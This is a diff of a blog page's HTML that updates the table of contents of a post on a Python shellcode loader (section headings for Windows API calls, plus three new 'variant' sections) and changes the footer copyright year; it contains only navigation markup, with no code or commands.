@@ -709,7 +694,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ShellCode-Loader"><span class="nav-number">1.</span> <span class="nav-text">ShellCode Loader</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python？"><span class="nav-number">2.</span> <span class="nav-text">Python？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctypes"><span class="nav-number">3.</span> <span class="nav-text">ctypes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VirtualAlloc"><span class="nav-number">4.</span> <span class="nav-text">VirtualAlloc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RtlMoveMemory"><span class="nav-number">5.</span> <span class="nav-text">RtlMoveMemory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VirualProtect"><span class="nav-number">6.</span> <span class="nav-text">VirualProtect</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CreateThread"><span class="nav-number">7.</span> <span class="nav-text">CreateThread</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WaitForSingleObject"><span class="nav-number">8.</span> <span class="nav-text">WaitForSingleObject</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C-原型"><span class="nav-number">9.</span> <span class="nav-text">C++原型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">10.</span> <span class="nav-text">小结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ShellCode-Loader"><span class="nav-number">1.</span> <span class="nav-text">ShellCode Loader</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python？"><span class="nav-number">2.</span> <span class="nav-text">Python？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctypes"><span class="nav-number">3.</span> <span class="nav-text">ctypes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VirtualAlloc"><span class="nav-number">4.</span> <span class="nav-text">VirtualAlloc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RtlMoveMemory"><span class="nav-number">5.</span> <span class="nav-text">RtlMoveMemory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VirualProtect"><span class="nav-number">6.</span> <span class="nav-text">VirualProtect</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CreateThread"><span class="nav-number">7.</span> <span class="nav-text">CreateThread</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WaitForSingleObject"><span class="nav-number">8.</span> <span class="nav-text">WaitForSingleObject</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C-原型"><span class="nav-number">9.</span> <span class="nav-text">C++原型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#变形一"><span class="nav-number">10.</span> <span class="nav-text">变形一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#变形二"><span class="nav-number">11.</span> <span class="nav-text">变形二</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#变形三"><span class="nav-number">12.</span> <span class="nav-text">变形三</span></a></li></ol></div>
             
 
           </div>
@@ -729,7 +714,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
